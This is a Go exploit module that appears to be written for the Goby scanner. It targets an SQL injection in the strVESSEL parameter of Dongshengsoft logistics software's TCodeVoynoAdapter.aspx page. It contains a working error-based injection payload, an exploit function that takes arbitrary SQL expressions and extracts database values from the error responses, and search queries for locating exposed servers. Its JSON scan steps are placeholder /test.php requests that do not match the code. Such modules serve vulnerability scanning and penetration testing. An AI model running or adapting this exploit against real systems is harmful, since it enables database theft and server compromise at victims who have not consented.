package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongshengsoft /FeeCodes/TCodeVoynoAdapter.aspx File strVESSEL Parameter SQL Injection Vulnerability",
    "Description": "<p>SQL injection vulnerability exists in the list interface of Dongshengsoft and attackers can obtain sensitive database data through the vulnerability</p>",
    "Product": "Dongshengsoft",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2023-05-01",
    "PostTime": "2024-04-11",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"dhtmlxcombo_whp.js\"",
    "GobyQuery": "body=\"dhtmlxcombo_whp.js\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update.</p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "db_name()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "青岛东胜物流软件 /FeeCodes/TCodeVoynoAdapter.aspx 文件 strVESSEL 参数 SQL 注入漏洞",
            "Product": "青岛东胜物流软件",
            "Description": "<p>青岛东胜物流软件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感数据<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Dongshengsoft /FeeCodes/TCodeVoynoAdapter.aspx File strVESSEL Parameter SQL Injection Vulnerability",
            "Product": "Dongshengsoft",
            "Description": "<p>SQL injection vulnerability exists in the list interface of Dongshengsoft and attackers can obtain sensitive database data through the vulnerability<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update.</p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In&nbsp;addition&nbsp;to&nbsp;using&nbsp;SQL&nbsp;injection&nbsp;vulnerabilities&nbsp;to&nbsp;obtain&nbsp;information&nbsp;in&nbsp;the&nbsp;database&nbsp;(for&nbsp;example,&nbsp;the&nbsp;administrator's&nbsp;back-end&nbsp;password,&nbsp;the&nbsp;user's&nbsp;personal&nbsp;information&nbsp;of&nbsp;the&nbsp;site),&nbsp;an&nbsp;attacker&nbsp;can&nbsp;write&nbsp;a&nbsp;Trojan&nbsp;horse&nbsp;to&nbsp;the&nbsp;server&nbsp;even&nbsp;in&nbsp;a&nbsp;high-privileged&nbsp;situation&nbsp;to&nbsp;further&nbsp;obtain&nbsp;server&nbsp;system&nbsp;permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`
	makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestAAAA := regexp.MustCompile(RegularUrl)
		if !reRequestAAAA.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestAAAA.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/FeeCodes/TCodeVoynoAdapter.aspx"
			payload := `mask=0&pos=0&strVESSEL=1'+and+db_name()>0%3b--`
			cfg := httpclient.NewGetRequestConfig(uri + "?" + payload)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "nvarchar") {
					ss.VulURL = u.FixedHostInfo + `/FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1'+and+db_name()>0%3b--`
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			uri := "/FeeCodes/TCodeVoynoAdapter.aspx"
			payload := `mask=0&pos=0&strVESSEL=1'+and+` + sql + `>0%3b--`
			if attackType == "sql" {
				cfg := httpclient.NewGetRequestConfig(uri + "?" + payload)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
        responseBody, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				if err != nil {
					expResult.Output = err.Error()
					expResult.Success = false
					return expResult
				} 
        if len(responseBody.Utf8Html) > 0 {
					responseResult, err := makeRegularAAAA(responseBody.Utf8Html, "'([^']*)'")
					if err != nil {
						expResult.Output = err.Error()
						expResult.Success = false
						return expResult
					}
					expResult.Output = responseResult
					expResult.Success = true
				}
			} else if attackType == "sqlPoint" {
				payload := `mask=0&pos=0&strVESSEL=1'+and+db_name()>0%3b--`
				cfg := httpclient.NewGetRequestConfig(uri + "?" + payload)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				_, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				if err == nil {
					expResult.Success = true
					expResult.Output = `GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1'+and+db_name()>0%3b-- HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
				}
			}
			return expResult
		},
	))
}
